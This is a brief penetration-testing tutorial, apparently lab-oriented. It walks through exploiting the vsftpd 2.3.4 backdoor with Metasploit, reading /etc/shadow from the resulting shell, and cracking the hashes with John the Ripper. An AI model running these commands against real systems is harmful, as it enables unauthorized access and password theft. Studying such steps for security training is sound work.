# Password Hash Extraction from Linux-Based Systems

Find the target machine IP address using Nmap

then run `msfconsole`

Once inside `msfconsole`, search for the `vsftpd` command by typing `search vsftpd`. This will show you any available exploits related to `vsftpd`, which is a popular FTP server often used in Linux-based systems.

Next, select the `vsftpd_234_backdoor` exploit by typing `use exploit/unix/ftp/vsftpd_234_backdoor`. This will set the exploit to be used in the following steps.

Next, set the target ip address by typing `set RHOSTS <ip>` where `<ip>` is the IP address of the target machine you identified with nmap.

Finally, exploit the target machine by typing `exploit`. This will run the selected `vsftpd_234_backdoor` exploit on the target machine, allowing you to extract password hashes.

When you get the target system shell, type `cat /etc/shadow`

Copy hashes somewhere as a text file. 

On your Linux terminal:

```bash
john user_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

This command will run John the Ripper, a popular password cracking tool, on the file containing the password hashes (`user_hashes.txt`). It will use the `rockyou.txt` wordlist to try to crack the password hashes.

After running the previous command, you can view the cracked passwords by typing `john --show user_hashes.txt`. This will display the passwords that were successfully cracked by John the Ripper.
